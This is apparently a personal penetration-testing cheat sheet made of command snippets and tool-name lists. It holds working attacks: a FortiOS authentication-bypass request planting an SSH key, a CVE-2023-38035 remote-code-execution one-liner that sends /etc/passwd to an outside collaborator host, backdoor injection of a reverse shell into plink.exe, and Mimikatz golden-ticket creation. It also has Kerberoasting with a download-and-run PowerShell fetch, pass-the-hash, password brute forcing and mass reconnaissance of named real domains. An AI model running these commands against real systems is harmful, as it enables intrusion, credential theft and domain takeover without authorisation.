ffuf -w "host_list.txt:URL" -u "<https://URL/api/v2/cmdb/system/admin/admin>" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r


##-==============================-##
##    [+] PoC - CVE-2023-26256
##-==============================-##
## ----------------------------------------------------- ##
##    [?]  https://github.com/aodsec/CVE-2023-26256
## ----------------------------------------------------- ##
git clone https://github.com/aodsec/CVE-2023-26256.git
python3 CVE-2023-26256.py -h


##-==============================================-##
##    [+] CVE-2023-38035 - Unauthenticated RCE
##-==============================================-##
python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd [BURP-COLLABORATOR-URL.com](https://burp-collaborator-url.com/)', 'isRoot': True}, None)"





redfang
rfcat
rtlsdr-scanner
inspectrum
king-phisher
mdk3
mfcuk
mfoc
mfterm
libfreefare-bin


mimikatz
passing-the-hash
wce
xspy
armitage
pompem
mdbtools
shellnoob
sidguesser
websploit
unicorn-magic
backdoor-factory



kerberoast





##-======================================================================-##
##   [+] Backdoor-Factory - Injecting a Backdoor Shell into Plink.exe  
##-======================================================================-##
backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $IP -P 4444 -s reverse\_shell\_tcp




burpsuite


## -------------------------------- ##
##   [?] Platform Identification:
## -------------------------------- ##
##       -> Builtwith
##       -> Wappalyzer
##       -> Vulners Burp Plugin
## -------------------------------- ##


##       -> waybackurls [https://github.com/tomnomnom/waybackurls]

## -------------------------------- ##
	[+] SVN
	https://github.com/cure53/Flashbang


## -------------------------------- ##
##	[+] Git 
## -------------------------------- ##
##       -> https://github.com/arthaud/git-dumper.git
##       -> https://github.com/michenriksen/gitrob

7-Parameter discovery
	Parameth [https://github.com/maK-/parameth]
	Arjun    [https://github.com/s0md3v/Arjun]


8-scripts
	[+]phpinfo
			#!/bin/bash
			for ipa in 98.13{6..9}.{0..255}.{0..255}; do
			wget -t 1 -T 5 http://${ipa}/phpinfo.php; done&
	[+]certspotter
		curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
	[+]crtsh
		curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1

		#!/bin/bash

		echo "[+] Start gather subdomain "
		for i in `cat list.txt`
		do
		curl -s https://crt.sh/\?q\=$i\&output\=json | jq -r '.[].name_value'|sed 's/\*\.//g'|sort -u |tee -a domains.txt
		done
		echo "[+] httprope "
		cat domains.txt |httprobe|tee live-domain.txt
		echo "[+] End "




			https://github.com/arthaud/git-dumper.git
			https://github.com/michenriksen/gitrob



## -------------------------------------------------------------- ##
##   [?] Commix (short for [comm]and [i]njection e[x]ploiter).
## -------------------------------------------------------------- ##
##   [?] Commix - Automated All-in-One OS Command Injection and Exploitation Tool



routersploit



davtest

joomscan
jsql-injection
nikto
padbuster
skipfish
wig
wpscan
xsser
zaproxy
wafw00f
parsero


scalpel
xplico



hyperion
iodine
laudanum
nishang
pwnat
sbd
shellter
webacoo
weevely


impacket-scripts






KerberosTGTData

KerberosTickets – List Kerberos tickets. If elevated, 
list all grouped by all logon sessions.






Golden Ticket Creation (File)

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:<krbtgthash> /ticket:newadmin.tkt



Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session

	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:<krbtgthash> /ptt


To create a Golden ticket to own the parent domain, 
once a child domain controller is compromised 
you will need the following pieces:

	/user:ChildDomainControllerMachineName$  
	/rc4: KRBTGT Hash
	/sid:Child Domain SID
	/domain:FQDN of Child Domain
	/groups:516 
	/sids:ParentSID-516,S-1-5-9 
	/id:ID of Child Domain Controller 
	/ptt






##-===========================================================-##
##      [+] Kerberos - Kerberoast - 
##-===========================================================-##


## ------------------------------------------------------ ##
##    [?] https://github.com/nidem/kerberoast
##    [?] https://room362.com/post/2016/kerberoast-pt1/
##    [?] https://room362.com/post/2016/kerberoast-pt2/
##    [?] https://room362.com/post/2016/kerberoast-pt3/
## ------------------------------------------------------ ##


	Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.com" 


##-======================================================-##
##   [+] Mimikatz - Export SPN Tickets once requested:
##-======================================================-##
## ---------------------------------------------------------------------- ##
##    [?] Generates one file per ticket (unless base64 option is used)
## ---------------------------------------------------------------------- ##
	mimkatz kerberos::list /export
	Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'


Impacket method of extracting SPN tickets and output hashes 
in the correct format for John via Proxychains and Beacon

	proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip <domain controller IP> -outputfile <out.dump>



##-=============================-##
##   [+] Cracking the hashes
##-=============================-##
hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule

john --format=krb5tgs spns.dump --wordlist=


## Domain Admin Privesc Methods
https://adsecurity.org/?p=2362

 1. Passwords in SYSVOL & Group Policy Preferences

 	findstr /S cpassword %logonserver%\sysvol\*.xml

Get-GPPPasswords.ps1 from PowerSploit

 2. Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch
 3. Kerberos TGS Service Ticket Offline Cracking (Kerberoast)
 4. The Credential Theft Shuffle
 5. Gain access to AD Database file (ntds.dit)
 	* Backup locations (backup server storage, media, and/or network shares)
 	* Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.
 	* With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.



 
Kerbsniff
KerbCrack



##-=============================================-##
##   [+] NMap - Kerberos - Source Port Scan:
##-=============================================-##
nmap -g <port> (88 (Kerberos) 


nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=research $IP



##-=================================-##
##   [+] Kerberos - Bruteforcing
##-=================================-##
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>


##-=======================================================-##
##   [+] Rubeus - Brute Module - Use list of users file:
##-=======================================================-##
Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>


##-=================================================================================-##
##   [+] Rubeus - Brute Module - check Passwords For All Users In Current Domain:
##-=================================================================================-##
Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>


##-=======================================================-##
##   [+] Kerberos - Password Cracking with dictionary:
##-=======================================================-##
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>



##-=======================-##
##   [+] Kerberoasting
##-=======================-##


##-===============================================================-##
##   [+] Attempt to get a list of user service principal names
##-===============================================================-##
GetUserSPNs.py -request -dc-ip $IP active.htb/svc_tgs


##-==============================-##
##   [+] Impacket - Kerberoast:
##-==============================-##
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>


##-=============================-##
##   [+] Rubeus - Kerberoast:
##-=============================-##
Rubeus.exe kerberoast /outfile:<output_TGSs_file>


##-=================================-##
##   [+] Powershell - Kerberoast:
##-=================================-##
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>




##-===============================================-##
##   [+] Pass The Hash (PTH)/Pass The Key (PTK)
##-===============================================-##


##-=============================================-##
##   [+] Impacket - Request the TGT with hash
##-=============================================-##
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>


##-================================================-##
##   [+] Impacket - Request the TGT with aesKey 
##-================================================-##
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>


##-==================================================-##
##   [+] Impacket - Request the TGT with password
##-==================================================-##
python getTGT.py <domain_name>/<user_name>:[password]


##-==================================================-##
##   [+] Impacket - Set the TGT for impacket
##-==================================================-##
export KRB5CCNAME=<TGT_ccache_file>


##-==================================================-##
##   [+] Impacket - TGT - Execute remote commands:
##-==================================================-##
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass




##-==================================-##
##   [+] Kerberos - Golden Ticket
##-==================================-##


##-==============================================================-##
##   [+] Impacket - Golden Ticket - Generate the TGT with NTLM
##-==============================================================-##
python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>


##-=================================================================-##
##   [+] Impacket - Golden Ticket - Generate the TGT with AES key
##-=================================================================-##
python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>


##-==============================================================-##
##   [+] Mimikatz - Golden Ticket - Generate the TGT with NTLM
##-==============================================================-##
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>


##-=====================================================================-##
##   [+] Mimikatz - Golden Ticket - Generate the TGT with AES 128 key
##-=====================================================================-##
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>


##-=====================================================================-##
##   [+] Mimikatz - Golden Ticket - Generate the TGT with AES 256 key
##-=====================================================================-##
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>


##-===============================================-##
##   [+] Mimikatz - Golden Ticket - Inject TGT
##-===============================================-##
mimikatz # kerberos::ptt <ticket_kirbi_file>





##-=============================================-##
##   [+] XFreeRDP - Kerberos Authentication:
##-=============================================-##
xfreerdp /u:alice /v:10.11.1.50



##-=========================================================-##
##   [+] Metasploit - Kerberos Checksum Auxiliary Module:
##-=========================================================-##
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum








ngrep
netsed
osslsigncode
ghidra
javasnoop
rizin
rizin-cutter
smali
firmware-mod-kit
clang









##-=============================================-##
##   [+] AssetFinder - Subdomain Harvesting:
##-=============================================-##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt



assetfinder -subs-only $Domain >> $Dir/assetfinder.txt


echo "  - Found: $(cat assetfinder.txt | wc -l)"




##-============================================-##
##    [+]  
##-============================================-##
assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
python3 ~/tools/Sublist3r/


##-============================================-##
##     [+] ffuf - Search to files using assetfinder and ffuf
##-============================================-##
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'



##-======================-##
##    [+]  :
##-======================-##
assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"



##-=========================-##
##    [+]  Recon subdomains and Screenshot to URL using gowitness

##-==============================-##
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 






findomain -u $Dir/findomain.txt -t $Domain


sublist3r -v -d $Domain -o $Dir/sublist3r.txt
sed -i 's/<BR>/\n/g' $Dir/sublist3r.txt
sort $Dir/sublist3r.txt | uniq > $Dir/sublist3r-fl.txt

subfinder -d $Domain -o $Dir/subfinder.txt -config $Dir/subfinder-config.yaml

amass enum  --passive -d $Domain -config $Dir/amass-config.ini -o $Dir/$File.txt

findomain -q -f /$Dir/$File -r -u findomain_domains.txt


amass enum -df /$Dir/$File -passive -o amass_passive_domains.txt
subfinder -dL /$Dir/$File -o subfinder_domains.txt


cat domains.txt | httprobe -c 50 -t 3000 >$File.txt

cat alive.txt | aquatone -silent --ports xlarge -out $Dir/ -scan-timeout 500 -screenshot-timeout 50000 -http-timeout 6000

dirsearch.py -E -t 50 --plain-text $Dir/$File -u $host -w /$Dir/$File.txt | grep Target


amass -active -brute -o $File.txt -d $Domain


performing Reconnaissance on domain names
Subdomain Dictionary Brute Force


cat $File.txt | aquatone

cat $File.xml | aquatone -nmap

cat $File.txt | aquatone -ports large

cat $File.txt | aquatone -ports 80,443,3000,3001


 | aquatone -debug
 | aquatone -http-timeout
 | aquatone -proxy
 | aquatone -out  
 | aquatone -save-body
 | aquatone -scan-timeout
 | aquatone -threads 
 | aquatone -template-path 
 | aquatone -silent 
 | aquatone -session 
 | aquatone -screenshot-timeout 
 | aquatone -resolution 





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Sublist3r - OSINT Subdomain Enumeration Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




sublist3r -d $Domain

sublist3r -d $Domain --verbose --bruteforce

sublist3r -d $Target -vvv -o $Dir/domains-sublist3r-$Domain.txt



##-=================================================-##
##   [+] Sublist3r - Harvest Full 3rd lvl Domains
##-=================================================-##
for Domain in $(cat $URL/recon/3rd-lvl-domains.txt);do sublist3r -d $Domain -o $URL/recon/3rd-lvls/$domain.txt;done


sublist3r2 -d $Domain -b -t 64 -o $File.txt

sublist3r2 -d $Domain -o $File.txt

sublist3r2 -d $Domain -t 20 -p 21,22,80,110,443,445,3306,3389 -o $File.txt

sublist3r2 -e google,yahoo,virustotal -d $Domain -o $File.txt


##-============================================-##
##   [+] HTTProbe - Probe For Alive Domains:
##-============================================-##
cat $URL/recon/final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> $URL/recon/httprobe/alive.txt



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SubFinder - OSINT Subdomain Enumeration Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


subfinder -d $Domain

subfinder -d $Domain -t 100 -v


subfinder -o $Dir/domains-subfinder-$Domain.txt -b -d $Domain -w $Domains DEFAULT -t 100


## -------------------------------------- ##
##   [?] Running httpx with subfinder
## -------------------------------------- ##
subfinder -d $Domain | httpx -status-code

subfinder -d $Domain | httpx -title -tech-detect -status-code -title -follow-redirects



##-=======================================-##
##   [+] SubFinder - 
##-=======================================-##
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"


##-=======================================-##
##   [+] SubFinder - 
##-=======================================-##
subfinder -d "$domain" -all -config "$HOME"/ReconPi/configs/config.yaml -o "$SUBS"/subfinder.txt





##-=======================================-##
##   [+] SubJack - 
##-=======================================-##
subjack -w "$SUBS"/hosts -a -ssl -t 50 -v -c "$HOME"/go/src/github.com/haccer/subjack/fingerprints.json -o "$SUBS"/all-takeover-checks.txt -ssl



subjack -w $url/recon/httprobe/alive.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3

#!/bin/bash
$DOMAIN=$1
for host in $(dig +short $DOMAIN ns);
 do
  dig +short $host >> resolvers.txt;
 done


subbrute.py /usr/share/wordlists/SecLists/Discovery/DNS/dns-Jhaddix.txt $DOMAIN | massdns -r ./resolvers.txt -w $DOMAIN.massdns.jhaddix.txt -t A -o S


brutedns.py -d $2 -s fast -l 5



## ------------------------------------------------------------------------------------------ ##
##    altdns -i $InFile                  ## [?] List of subdomains input
## ------------------------------------------------------------------------------------------ ##
##    altdns --wordlist $File            ## [?] List of words to alter the subdomains with
## ------------------------------------------------------------------------------------------ ##
##    altdns --resolve                   ## [?] Resolve all altered subdomains
## ------------------------------------------------------------------------------------------ ##
##    altdns --dnsserver $IP             ## [?] IP address of resolver
## ------------------------------------------------------------------------------------------ ##
##    altdns --save $File                ## [?] File to save resolved altered subdomains
## ------------------------------------------------------------------------------------------ ##
##    altdns --threads $NumThreads       ## [?] Amount of threads to run simultaneously
## ------------------------------------------------------------------------------------------ ##



altdns -l ~/urls.txt -o $File.txt





altdns --input /$Dir/$Domains.txt --output $OutFile --wordlist 



altdns cat resolved_results



altdns -i ../dir$domain/domains.txt -o ../dir$domain/altdns_data_output.txt  -r -s ../dir$domain/altdns_domains.txt



altdns --input /$Dir/$Domains.txt --output $OutFile -w $PermList -r -s $Results.txt



# https://github.com/drduh/config/blob/master/scripts/dig.sh
query=""
for type in {A,AAAA,ALIAS,CNAME,MX,NS,PTR,SOA,SRV,TXT,DNSKEY,DS,NSEC,NSEC3,NSEC3PARAM,RRSIG,AFSDB,ATMA,CAA,CERT,DHCID,DNAME,HINFO,ISDN,LOC,MB,MG,MINFO,MR,NAPTR,NSAP,RP,RT,TLSA,X25} ; do
  dig +noall +short +noshort +answer $query $type ${1} 2>/dev/null
done




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] theHarvester - OSINT 
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b all		    			##  Search Using All The Configured APIs
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b spyse					##  Search Using The Spyse API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b sublist3r				##  Search Using The Sublist3r API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b certspotter				##  Search Using The Certspotter API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b crtsh					##  Search Using The Crtsh API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b dnsdumpster				##  Search Using The DNSDumpster API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b censys					##  Search Using The Censys API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b hackertarget				##  Search Using The HackerTarget API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b hunter					##  Search Using The Hunter API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b netcraft					##  Search Using The Netcraft API
## ---------------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b jigsaw					##  Search Using The Jigsaw API
## ---------------------------------------------------------------------------------------------------------- ##

## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b github-code				##  Search Using The Github-Code API
## ---------------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b duckduckgo				##  Search Using The DuckDuckGo API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b qwant					##  Search Using The QWant API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b bing						##  Search Using The Bing API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b bingapi					##  Search Using The Bingapi API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b google					##  Search Using The Google API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b googleCSE				##  Search Using The Google API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b googleplus				##  Search Using The GooglePlus API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b google-profiles			##  Search Using The Google API
## ---------------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b urlscan					##  Search Using The URLScan API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b virustotal				##  Search Using The VirusTotal API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b threatcrowd				##  Search Using The ThreatCrowd API
## ---------------------------------------------------------------------------------------------------------- ##


## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b pgp					    ##  Search Using The PGP API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b twitter					##  Search Using The Twitter API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b linkedin					##  Search Using The LinkedIn API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b intelx					##  Search Using The Intelx API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b linkedin_links			##  Search Using The Linkedin_links API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b securityTrails			##  Search Using The SecurityTrails API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b pentesttools				##  Search Using The PentestTools API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b projectdiscovery		    ##  Search Using The ProjectDiscovery API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b rapiddns					##  Search Using The RapidDNS API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b baidu					##  Search Using The Baidu API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b omnisint					##  Search Using The Omnisint API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b otx						##  Search Using The OTX API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b exalead					##  Search Using The Exalead API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b bufferoverun				##  Search Using The BufferOverun API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b threatminer				##  Search Using The ThreatMiner API
## ---------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain -b trello					##  Search Using The Trello API
## ---------------------------------------------------------------------------------------------------------- ##
##
##
##-============================================================================================-##
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
##-============================================================================================-##
##
## ---------------------------------------------------------------------------------------------------------------- ##
		theHarvester -d $Domain --dns-lookup			## Perform A DNS Reverse Query on All Ranges Discovered
		theHarvester -d $Domain --dns-brute				## Perform A DNS Brute Force For The Domain Name
		theHarvester -d $Domain --dns-tld		        ## Perform A DNS TLD Expansion Discovery
		theHarvester -d $Domain --dns-server $DNS		## Specfic A DNS Server
		theHarvester -d $Domain --shodan		        ## Use SHODAN Database To Query Discovered Hosts
		theHarvester -d $Domain --google-dork			## Use Google Dorks for Google search
## ---------------------------------------------------------------------------------------------------------------- ##
##
##
##-============================================================================================-##
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
##-============================================================================================-##
##
## ----------------------------------------------------------------------------------------------------------------------- ##
	    theHarvester -d $Domain -l 50 -b google					## Limit the number of Google search results to 50
		theHarvester -d $Domain -l 50 -b bing					## Limit the number of Bing search results to 50
		theHarvester -d $Domain -l 50 -b linkedin				## Limit the number of LinkedIn search results to 50
		theharvester -d $Domain -b googleCSE -l 500 -s 300		## Limit 500 Queries, Start with result number 300
## ----------------------------------------------------------------------------------------------------------------------- ##
##
##-============================================================================================-##
##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##
##-============================================================================================-##
##



##-=====================================================-##
##   [+] Search Google for Domain - Limit 500 queries
##-=====================================================-##
theharvester -d $Domain -l 500 -b google --filename $Domain.html


##-=========================-##
##   [+] Harvester - Flags
##-=========================-##
theharvester -d $Domain -l $Limit -b $DataSource


##-=======================================-##
##   [+] Harvester Data Source - Twitter
##-=======================================-##
theharvester -d $Domain -l 500 -b twitter


##-===================================================-##
##   [+] Harvester Data Source - All Search Engines
##-===================================================-##
theharvester -d $Domain -l 500 -b all -b all


##-=======================================-##
##   [+] Harvester Data Source - Google
##-=======================================-##
theharvester -d $Domain -l 500 -b google
theharvester -d $Domain -b google > google.txt


##-=====================================================-##
##   [+] Use SHODAN Database To Query Discovered Hosts
##-=====================================================-##
theharvester -d $Domain -h > $Domain-SHODAN-Query.txt




##-============================================-##
##   [+] Extract hostnames from the results:
##-============================================-##
grep -Po '(?<=\<host\>)(?!\<(?:ip|hostname)\>)[^\s]+?(?=\<\/host\>)|(?<=\<hostname\>)[^\s]+?(?=\<\/hostname\>)' theharvester_results.xml | sort -uf | tee -a subdomains.txt


##-======================================-##
##   [+] Extract IPs from the results:
##-======================================-##
grep -Po '(?<=\<ip\>)[^\s]+?(?=\<\/ip\>)' theharvester_results.xml | sort -uf | tee -a ips.txt


##-==========================================-##
##   [+] Extract emails from the results:
##-==========================================-##
grep -Po '(?<=\<email\>)[^\s]+?(?=\<\/email\>)' theharvester_results.xml | sort -uf | tee -a emails.txt







## -------------------------------------------------------------- ##
##   [?] Photon - Open Source Intelligence (OSINT) - Crawler
## -------------------------------------------------------------- ##
##   [?] https://github.com/s0md3v/Photon
## -------------------------------------------------------------- ##


## -------------------------------------------------------------- ##
##   [?] Photon can extract the following data while crawling:
## -------------------------------------------------------------- ##
##       --> URLs (in-scope & out-of-scope)
##       --> URLs with parameters (example.com/gallery.php?id=2)
##       --> Intel (emails, social media accounts, amazon buckets etc.)
##       --> Files (pdf, png, xml etc.)
##       --> Secret keys (auth/API keys & hashes)
##       --> JavaScript files & Endpoints present in them
##       --> Strings matching custom regex pattern
##       --> Subdomains & DNS related data
## -------------------------------------------------------------- ##


photon -u $URL -l 3 -t 100


## -------------------------------------------------------------------------------- ##
photon --url $URL                   ## root url
photon --cookie $File               ## cookie
photon --regex $Pattern             ## regex pattern
photon --threads $Num               ## number of threads
photon --delay $Num                 ## delay between requests
photon --verbose                    ## verbose output
photon --user-agent $UserAgent      ## custom user agent(s)
photon --export csv                 ## Export report as csv
photon --export json                ## Export report as json
photon --output $File               ## 
photon --level $Num                 ## 
photon --clone $URL                 ## clone the website locally
photon --headers                    ## add headers
photon --dns                        ## enumerate subdomains and DNS data
photon --keys                       ## find secret keys
photon --only-urls                  ## only extract URLs
photon --wayback                    ## fetch URLs from archive.org as seeds
## -------------------------------------------------------------------------------- ##



photon.py -u $URL

photon.py -u $URL -l 3

photon.py -u $URL -r "\d{10}"

photon.py -u $URL -c "PHPSSID=821b32d21"


photon.py -u $URL -t 10

photon.py -u $URL -d 1

photon.py -u $URL --ninja

photon.py -u $URL --dns

photon.py -u $URL -s "http://example.com/portals.html,http://example.com/blog/2018"



photon.py -u $URL -l 3 -t 10 -v --wayback --keys --dns





osmedeus.py -t $Domain



## --------------------------------------------- ##
##  [?] Enumerates a domain For DNS entries
## --------------------------------------------- ##
dnsdict6 -4 -d -t 16 -e -x $Domain







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] TLS/SSL - Enumeration + Recon + Auditing
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


sslscan $IP:443
sslscan --ipv4 --show-certificate --ssl2 --ssl3 --tlsall --no-colour $Domain



echo "Please provide the target ip address and the port."

sslscan --show-certificate --verbose --no-colour --xml=sslscan_$1_$2.xml $1:$2 2>&1 | tee "$1_$2_sslscan.txt"


sslh




sslyze $Domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3

sslyze -regular $Domain


tlssled $Domain 443

sslyze $domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers

sslyze $domain --resume --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers > tmp



## ------------------------------------------------------- ##
##  [?] SSLsplit - A tool for man-in-the-middle attacks 
##                 against SSL/TLS encrypted connections.
## ------------------------------------------------------- ##
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080



##-=============================-##
##   [+] Cero - TLS Probing
##-=============================-##
cero $Domain | sed 's/^*.//' | grep "\." | sort -u | grep ".$Domain$" > $Dir/$OutFile




httsquash -r $Domain

httprint -h $Domain -s $File.txt -P0


## ------------------------------------------------- ##
##   [+] Harvesting subdomains with assetfinder...
## ------------------------------------------------- ##
assetfinder $URL | grep '.$URL' | sort -u | tee -a $File.txt


assetfinder -subs-only $Domain > $File
assetfinder -subs-only $Domain > $subs_dir/assetfinder.txt



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
